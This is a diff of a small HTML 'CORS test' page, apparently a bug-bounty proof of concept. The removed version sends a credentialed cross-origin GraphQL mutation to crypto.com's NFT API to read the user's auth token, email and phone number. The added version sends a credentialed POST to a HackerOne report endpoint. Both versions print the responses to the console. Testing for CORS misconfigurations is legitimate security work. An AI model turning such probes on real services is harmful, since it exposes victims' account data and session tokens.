@@ -1,82 +1,33 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CORS Test - GraphQL</title>
+  <title>CORS Test - REST Endpoint</title>
 </head>
 <body>
 <script>
-  // GraphQL query and fragment
-  var data = {
-    query: `
-      fragment MeResponse on Me {
-        uuid
-        verified
-        id
-        username
-        email
-        countryCode
-        phoneNumber
-        isPhoneNumberVerified
-      }
+  // URL of the endpoint
+  const url = "https://hackerone.com/reports/3295863.json";
+console.log(document.cookies,"cookies")
+  // Create XMLHttpRequest
+  const xhr = new XMLHttpRequest();
+  xhr.open('POST', url, true);
+  xhr.withCredentials = true; // include cookies for authentication
 
-      mutation continueAuthentication($clientOtpCode: String, $emailOtpCode: String, $smsOtpCode: String) {
-        continueAuthentication(
-          clientOtpCode: $clientOtpCode
-          emailOtpCode: $emailOtpCode
-          smsOtpCode: $smsOtpCode
-        ) {
-          __typename
-          ... on AuthV2 {
-            me {
-              ...MeResponse
-              __typename
-            }
-            token
-            __typename
-          }
-          ... on ContinueAuth {
-            requiredSteps
-            token
-            unauthorizedMe {
-              email
-              name
-              username
-              uuid
-              registrationCompleted
-              __typename
-            }
-            __typename
-          }
-        }
-      }
-    `,
-    variables: {
-      clientOtpCode: null,
-      emailOtpCode: null,
-      smsOtpCode: null
+  xhr.onload = function() {
+    if (xhr.status >= 200 && xhr.status < 300) {
+      console.log("Response from server:", xhr.responseText);
+    } else {
+      console.warn("Request failed with status:", xhr.status, xhr.statusText);
     }
   };
-  // Create XHR
 
-  var req = new XMLHttpRequest();
-  console.log(document.cookies,"cookies")
-  req.open('POST', 'https://crypto.com/nft-api/graphql', true);
-  req.withCredentials = true; // include cookies / JWT
-  req.setRequestHeader('Content-Type', 'application/json');
- // req.setRequestHeader('Authorization', Authorization);
-  //req.setRequestHeader('Sec-Ch-Ua-Platform', "Windows");
-console.log(document.cookies,"cookies")
-  req.onload = function() {
-    console.log("Response from server:", this.responseText);
+  xhr.onerror = function() {
+    console.error("Network error or CORS blocked the request");
   };
 
-  req.onerror = function() {
-    console.error("Request failed");
-  };
-console.log(document.cookies,"cookies")
-  req.send(JSON.stringify(data));
+  // Send the request
+  xhr.send();
 </script>
-  <h1>cors test</h1>
+  <h1>cors test page</h1>
 </body>
 </html>
-
